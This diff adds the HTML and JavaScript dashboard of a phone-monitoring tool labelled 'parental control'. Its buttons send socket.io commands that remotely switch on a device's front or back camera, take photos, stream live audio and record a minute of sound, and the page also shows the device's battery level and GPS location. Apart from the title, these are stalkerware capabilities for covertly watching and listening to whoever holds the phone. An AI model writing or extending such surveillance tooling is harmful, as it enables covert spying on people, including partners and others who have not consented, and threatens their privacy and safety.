@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Parental Control Dashboard</title>
+    <style>
+        body { background: #1a1a1a; color: white; font-family: sans-serif; text-align: center; }
+        .stats { display: flex; justify-content: space-around; background: #333; padding: 10px; }
+        .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 20px; }
+        button { padding: 15px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        .btn-live { background: #2196F3; color: white; }
+        .btn-snap { background: #4CAF50; color: white; }
+        .btn-stop { background: #f44336; color: white; grid-column: span 2; }
+        #live-view { width: 100%; max-width: 500px; border: 2px solid #555; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="stats">
+        <div id="bat">🔋 Battery: --%</div>
+        <div id="gps">📍 <span id="loc">Waiting...</span></div>
+    </div>
+
+    <img id="live-view" src="">
+
+    <div class="controls">
+        <button class="btn-live" onclick="send('camera-back')">🎥 Live Back</button>
+        <button class="btn-live" onclick="send('camera-front')">🤳 Live Front</button>
+        <button class="btn-snap" onclick="send('snap-back')">📸 Photo Back</button>
+        <button class="btn-snap" onclick="send('snap-front')">📸 Photo Front</button>
+        <button class="btn-live" onclick="send('live-audio')">🎙️ Listen Live</button>
+        <button class="btn-live" onclick="record()">⏺️ Record 1 Min</button>
+        <button class="btn-stop" onclick="send('stop-all')">🛑 STOP ALL</button>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        const send = (c) => socket.emit('parent-command', c);
+        const record = () => socket.emit('parent-command', {cmd: 'record-audio', time: 60000});
+
+        socket.on('render-feed', (d) => document.getElementById('live-view').src='data:image/jpeg;base64,'+d);
+        socket.on('render-battery', (l) => document.getElementById('bat').innerText = `🔋 Battery: ${l}%`);
+        socket.on('render-location', (c) => {
+            const url = `https://www.google.com/maps?q=${c.lat},${c.lng}`;
+            document.getElementById('loc').innerHTML = `<a href="${url}" target="_blank" style="color:cyan">View Map</a>`;
+        });
+    </script>
+</body>
+</html>
